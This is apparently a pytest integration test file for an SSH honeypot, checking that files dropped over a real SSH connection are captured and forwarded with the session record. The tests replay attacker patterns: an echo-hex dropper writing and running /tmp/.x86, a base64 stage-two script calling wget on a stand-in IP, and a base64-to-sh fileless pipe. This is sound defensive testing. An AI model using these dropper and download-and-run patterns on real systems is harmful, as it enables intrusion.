"""Files written over a real SSH connection reach the session record intact.

The unit tests prove the interpreter; these prove the wiring — that a command
arriving through asyncssh is captured from its raw form, that an interactive
heredoc is reassembled across lines, and that the content survives the close
of the connection and is forwarded with the session.
"""

import asyncio
import base64
import hashlib

import asyncssh
import pytest

from honeypot.core.config import config
from honeypot.core.session import session_manager
from honeypot.emulators.ssh import SSHHoneypot

PORT = 24310


@pytest.fixture
async def ssh_honeypot(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "bind_address", "127.0.0.1")
    monkeypatch.setattr(config, "session_capture_dir", str(tmp_path / "sessions"))
    monkeypatch.setattr(config, "file_capture_dir", str(tmp_path / "uploads"))
    # One fast key: generating RSA-3072 per test adds seconds and tests nothing here.
    monkeypatch.setattr(
        SSHHoneypot, "_host_keys", lambda self: [asyncssh.generate_private_key("ssh-ed25519")]
    )

    ingested: asyncio.Queue = asyncio.Queue()

    async def capture_ingest(session):
        await ingested.put(session.to_backend_payload())

    monkeypatch.setattr(session_manager, "_send_to_backend", capture_ingest)

    honeypot = SSHHoneypot()
    honeypot.port = PORT
    await honeypot.start()
    try:
        yield PORT, ingested
    finally:
        await honeypot.stop()


def _connect(port):
    return asyncssh.connect(
        "127.0.0.1", port, username="root", password="root",
        known_hosts=None, client_keys=None, agent_path=None,
    )


async def _next_payload(ingested):
    return await asyncio.wait_for(ingested.get(), timeout=10)


def _upload(payload, remote_path):
    matches = [u for u in payload["uploads"] if u["remote_path"] == remote_path]
    assert matches, f"{remote_path} not captured: {[u['remote_path'] for u in payload['uploads']]}"
    return matches[0]


async def test_echoloader_over_exec_is_captured_and_forwarded(ssh_honeypot):
    port, ingested = ssh_honeypot
    binary = b"\x7fELF\x01\x01\x01" + bytes(range(256))
    chunks = [binary[i:i + 40] for i in range(0, len(binary), 40)]
    lines = ["cd /tmp || cd /var/run"]
    for index, chunk in enumerate(chunks):
        escaped = "".join(f"\\x{b:02x}" for b in chunk)
        lines.append(f"echo -ne '{escaped}' {'>' if index == 0 else '>>'} .x86")
    lines += ["chmod +x .x86", "./.x86"]

    async with _connect(port) as conn:
        await conn.run("; ".join(lines))

    payload = await _next_payload(ingested)
    upload = _upload(payload, "/tmp/.x86")
    assert upload["sha256"] == hashlib.sha256(binary).hexdigest()
    assert upload["source"] == "ssh_shell"
    assert upload["methods"] == ["echo"]
    assert base64.b64decode(upload["content_b64"]) == binary


async def test_case_sensitive_base64_survives(ssh_honeypot):
    port, ingested = ssh_honeypot
    script = b"#!/bin/sh\nwget http://198.51.100.23/Mixed/CaseName\n"
    encoded = base64.b64encode(script).decode()

    async with _connect(port) as conn:
        await conn.run(f"echo {encoded} | base64 -d > /tmp/Stage2.sh")

    upload = _upload(await _next_payload(ingested), "/tmp/Stage2.sh")
    assert base64.b64decode(upload["content_b64"]) == script


async def test_piped_script_is_captured_even_though_nothing_is_written(ssh_honeypot):
    port, ingested = ssh_honeypot
    script = b"#!/bin/sh\necho fileless\n"
    encoded = base64.b64encode(script).decode()

    async with _connect(port) as conn:
        await conn.run(f"echo {encoded} | base64 -d | sh")

    upload = _upload(await _next_payload(ingested), "(piped to sh)")
    assert upload["source"] == "ssh_piped"
    assert base64.b64decode(upload["content_b64"]) == script


async def test_interactive_heredoc_is_reassembled_across_lines(ssh_honeypot):
    port, ingested = ssh_honeypot
    script = "cat > /root/.cfg << 'EOF'\n\tindented line\nsecond line\nEOF\nexit\n"

    async with _connect(port) as conn:
        process = await conn.create_process()
        process.stdin.write(script)
        process.stdin.write_eof()
        await asyncio.wait_for(process.wait(), timeout=10)

    upload = _upload(await _next_payload(ingested), "/root/.cfg")
    # Without a terminal the tab is content, and survives.
    assert base64.b64decode(upload["content_b64"]) == b"\tindented line\nsecond line\n"


async def test_echo_replies_like_bash(ssh_honeypot):
    port, ingested = ssh_honeypot
    async with _connect(port) as conn:
        quoted = await conn.run('echo "Hello World"')
        redirected = await conn.run("echo data > /tmp/f")
    assert quoted.stdout == "Hello World\n"
    assert redirected.stdout == ""
    # One connection is one session, however many commands it runs.
    payload = await _next_payload(ingested)
    assert _upload(payload, "/tmp/f")["size"] == len(b"data\n")
